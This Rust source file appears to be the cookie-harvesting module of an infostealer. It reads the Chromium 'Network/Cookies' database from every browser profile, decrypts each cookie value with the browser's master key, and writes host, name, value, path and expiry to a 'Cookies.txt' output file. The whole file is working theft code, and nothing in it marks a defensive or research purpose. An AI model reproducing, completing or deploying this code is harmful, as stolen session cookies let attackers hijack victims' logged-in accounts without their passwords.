use alloc::boxed::Box;
use sqlite::{DatabaseReader, TableRecord, TableRecordExtension};
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec::Vec;
use sqlite::read_sqlite3_database_by_bytes;
use crate::alloc::borrow::ToOwned;
use tasks::{parent_name, Task};
use utils::browsers::chromium::{decrypt_data};
use utils::path::{Path, WriteToFile};
use crate::chromium::{Browser};
use crate::Cookie;

const COOKIES_HOST_KEY: usize                = 1;
const COOKIES_NAME: usize                    = 3;
const COOKIES_ENCRYPTED_VALUE: usize         = 5;
const COOKIES_PATH: usize                    = 6;
const COOKIES_EXPIRES_UTC: usize             = 7;

pub(super) struct CookiesTask {
    browser: Arc<Browser>
}

impl CookiesTask {
    pub(super) fn new(browser: Arc<Browser>) -> Self {
        Self { browser }
    }

    fn collect_cookies(&self) -> Vec<Cookie> {
        let mut result = Vec::new();

        for profile in &self.browser.profiles {
            let Some(cookies) = get_cookies(profile, &self.browser.master_key) else {
                continue
            };

            result.extend(cookies);
        }

        result
    }
}

impl Task for CookiesTask {
    parent_name!("Cookies.txt");

    unsafe fn run(&self, parent: &Path) {
        let mut cookies = self.collect_cookies();
        if cookies.is_empty() {
            return
        }

        cookies.sort();
        cookies.dedup();

        let _ = cookies
            .iter()
            .map(|cookie| cookie.to_string())
            .collect::<Vec<String>>()
            .join("\n")
            .write_to(parent);
    }
}

fn get_cookies(profile: &Path, master_key: &[u8]) -> Option<Vec<Cookie>> {
    let cookies_path = profile / "Network" / "Cookies";
    let bytes = cookies_path.read_file().ok()?;

    let db = read_sqlite3_database_by_bytes(&bytes)?;
    let table = db.read_table("Cookies")?;

    let mut cookies = Vec::with_capacity(table.records_length());

    for record in table {
        let Some(cookie) = extract_cookie_from_record(&record, master_key) else {
            continue
        };

        cookies.push(cookie);
    }

    Some(cookies)
}

fn extract_cookie_from_record(record: &Box<dyn TableRecord>, master_key: &[u8]) -> Option<Cookie> {
    let host_key = record.get_value(COOKIES_HOST_KEY)?.as_string()?.to_owned();
    let name = record.get_value(COOKIES_NAME)?.as_string()?.to_owned();
    let path = record.get_value(COOKIES_PATH)?.as_string()?.to_owned();
    let expires_utc = record.get_value(COOKIES_EXPIRES_UTC)?.as_integer()?;

    let encrypted_value = record.get_value(COOKIES_ENCRYPTED_VALUE)?.as_blob()?;
    let value = unsafe { decrypt_data(encrypted_value, master_key) }?;

    Some(Cookie {
        host_key,
        name,
        value,
        path,
        expires_utc
    })
}